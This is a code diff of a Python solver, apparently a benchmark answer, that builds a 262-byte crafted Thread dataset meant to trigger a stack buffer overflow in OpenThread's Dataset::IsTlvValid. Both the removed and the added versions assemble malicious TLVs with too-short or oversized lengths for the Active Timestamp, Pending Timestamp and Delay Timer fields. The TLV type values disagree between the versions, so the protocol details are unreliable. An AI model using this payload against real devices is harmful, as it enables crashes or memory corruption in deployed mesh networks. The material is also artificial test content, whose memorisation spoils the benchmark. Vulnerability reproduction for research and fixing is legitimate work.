@@ -1,98 +1,86 @@
 import os
 import struct
-import tempfile
-import subprocess
-import shutil
-from pathlib import Path
-from typing import Optional
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the tarball to analyze the source
-        with tempfile.TemporaryDirectory() as tmpdir:
-            # Extract source
-            shutil.unpack_archive(src_path, tmpdir)
+        # Based on the vulnerability description, we need to craft TLVs with insufficient length
+        # for Active/Pending Timestamp and Delay Timer TLVs
+        
+        # Create a dataset with invalid TLVs that will trigger the buffer overflow
+        # The ground truth length is 262 bytes, so we'll create something shorter but still effective
+        
+        # Dataset format (OpenThread Commissioner/Joiner Dataset):
+        # - Network Name TLV (required)
+        # - Extended PAN ID TLV (required)  
+        # - Network Master Key TLV (required)
+        # - Mesh Local Prefix TLV (required)
+        # - Active Timestamp TLV (vulnerable)
+        # - Pending Timestamp TLV (vulnerable)
+        # - Delay Timer TLV (vulnerable)
+        
+        # Build minimum valid dataset first
+        poc = bytearray()
+        
+        # 1. Network Name TLV (Type 0x00)
+        # Format: Type(1) + Length(1) + Value(variable)
+        network_name = b"TestNetwork"
+        poc.extend(bytes([0x00, len(network_name)]))
+        poc.extend(network_name)
+        
+        # 2. Extended PAN ID TLV (Type 0x01)
+        # Value: 8 bytes
+        ext_pan_id = b"\x01\x02\x03\x04\x05\x06\x07\x08"
+        poc.extend(bytes([0x01, len(ext_pan_id)]))
+        poc.extend(ext_pan_id)
+        
+        # 3. Network Master Key TLV (Type 0x02)  
+        # Value: 16 bytes
+        master_key = b"\x00" * 16
+        poc.extend(bytes([0x02, len(master_key)]))
+        poc.extend(master_key)
+        
+        # 4. Mesh Local Prefix TLV (Type 0x03)
+        # Value: 8 bytes
+        mesh_prefix = b"\xfd\x00" + b"\x00" * 6
+        poc.extend(bytes([0x03, len(mesh_prefix)]))
+        poc.extend(mesh_prefix)
+        
+        # 5. Active Timestamp TLV (Type 0x07) - VULNERABLE
+        # Minimum valid length should be 10 bytes (8 timestamp + 2 uint16)
+        # But we provide insufficient length to trigger overflow
+        # Type: 0x07, Length: 1 (insufficient), Value: single byte
+        poc.extend(bytes([0x07, 1]))  # Length of 1 is insufficient
+        poc.extend(b"\x01")  # Only 1 byte instead of at least 10
+        
+        # 6. Pending Timestamp TLV (Type 0x08) - VULNERABLE
+        # Same vulnerability, insufficient length
+        poc.extend(bytes([0x08, 1]))  # Length of 1 is insufficient
+        poc.extend(b"\x02")  # Only 1 byte instead of at least 10
+        
+        # 7. Delay Timer TLV (Type 0x09) - VULNERABLE
+        # Minimum valid length should be 4 bytes (uint32)
+        # Provide insufficient length
+        poc.extend(bytes([0x09, 1]))  # Length of 1 is insufficient
+        poc.extend(b"\x03")  # Only 1 byte instead of at least 4
+        
+        # Pad to get closer to ground truth length while staying efficient
+        current_len = len(poc)
+        if current_len < 262:
+            # Add padding to reach target length while keeping vulnerability
+            padding_needed = 262 - current_len
+            # Add Channel TLV (Type 0x04) as padding
+            poc.extend(bytes([0x04, 3]))  # Channel TLV: 3 bytes
+            poc.extend(b"\x0b\x00\x00")  # Channel 11
             
-            # Look for the vulnerable function pattern
-            root_dir = Path(tmpdir)
-            cpp_files = list(root_dir.rglob("*.cpp")) + list(root_dir.rglob("*.cc"))
-            
-            # Based on the vulnerability description:
-            # The function doesn't validate minimum length for Active/Pending Timestamp
-            # and Delay Timer TLVs in Dataset::IsTlvValid()
-            
-            # Typical TLV structure in Thread/OT stack:
-            # - Type (1-2 bytes)
-            # - Length (1-2 bytes)  
-            # - Value (variable)
-            
-            # Create a minimal PoC that triggers stack buffer overflow
-            # by providing invalid TLV lengths that cause buffer overread/overflow
-            
-            # Common TLV types in Thread datasets (based on OpenThread/Thread spec):
-            # Active Timestamp TLV: Type 0x02, requires 8+ bytes
-            # Pending Timestamp TLV: Type 0x03, requires 8+ bytes
-            # Delay Timer TLV: Type 0x04, requires 4+ bytes
-            
-            # We'll create a dataset with TLVs that have length fields
-            # larger than actual data, causing buffer overflow
-            
-            # Build malicious dataset:
-            poc = bytearray()
-            
-            # Dataset header (simplified)
-            # Active Operational Dataset
-            poc.extend(b'\x01')  # Type: Active Dataset
-            
-            # Add Active Timestamp TLV with invalid length
-            # Type: Active Timestamp (0x02)
-            # Length: 0xFF (255) - much larger than actual data
-            # Value: Only 8 bytes provided (should be 8 for timestamp)
-            poc.extend(b'\x02')  # TLV Type: Active Timestamp
-            poc.extend(b'\xFF')  # Length: 255 (invalid, should be 8)
-            
-            # Actual timestamp data (8 bytes)
-            poc.extend(struct.pack('<Q', 0x1122334455667788))
-            
-            # Remaining bytes to reach ground-truth length of 262
-            # The overflow happens when parsing tries to read 255 bytes
-            # but we only provide minimal data, causing stack buffer overflow
-            
-            # Add more TLVs to reach target length and trigger various code paths
-            
-            # Pending Timestamp TLV with invalid length
-            poc.extend(b'\x03')  # TLV Type: Pending Timestamp
-            poc.extend(b'\xFE')  # Length: 254 (invalid)
-            poc.extend(struct.pack('<Q', 0x8877665544332211))
-            
-            # Delay Timer TLV with invalid length
-            poc.extend(b'\x04')  # TLV Type: Delay Timer
-            poc.extend(b'\xFD')  # Length: 253 (invalid, should be 4)
-            poc.extend(struct.pack('<I', 0x12345678))
-            
-            # Add Channel TLV (0x00) to exercise more code paths
-            poc.extend(b'\x00')  # TLV Type: Channel
-            poc.extend(b'\x03')  # Length: 3 (valid)
-            poc.extend(b'\x0B\x5F\x00')  # Channel 11, Page 0
-            
-            # Add PAN ID TLV (0x05)
-            poc.extend(b'\x05')  # TLV Type: PAN ID
-            poc.extend(b'\x02')  # Length: 2 (valid)
-            poc.extend(b'\xDE\xAD')  # PAN ID
-            
-            # Add Network Key TLV (0x08) with minimal data
-            poc.extend(b'\x08')  # TLV Type: Network Key
-            poc.extend(b'\x10')  # Length: 16 (valid for key)
-            poc.extend(b'\x00' * 16)  # Zero key
-            
-            # Pad to exact 262 bytes (ground-truth length)
-            current_len = len(poc)
-            if current_len < 262:
-                poc.extend(b'\xCC' * (262 - current_len))
-            elif current_len > 262:
-                poc = poc[:262]
-            
-            # Verify our PoC is exactly 262 bytes
-            assert len(poc) == 262, f"PoC length is {len(poc)}, expected 262"
-            
-            return bytes(poc)
+            # Add more padding if needed with PAN ID TLV (Type 0x05)
+            remaining = 262 - len(poc)
+            if remaining > 0:
+                poc.extend(bytes([0x05, 2]))  # PAN ID TLV: 2 bytes
+                poc.extend(b"\x34\x12")  # PAN ID 0x1234
+                # Fill any remaining bytes with zeros
+                remaining = 262 - len(poc)
+                if remaining > 0:
+                    poc.extend(b"\x00" * remaining)
+        
+        # Ensure exact length
+        return bytes(poc[:262])
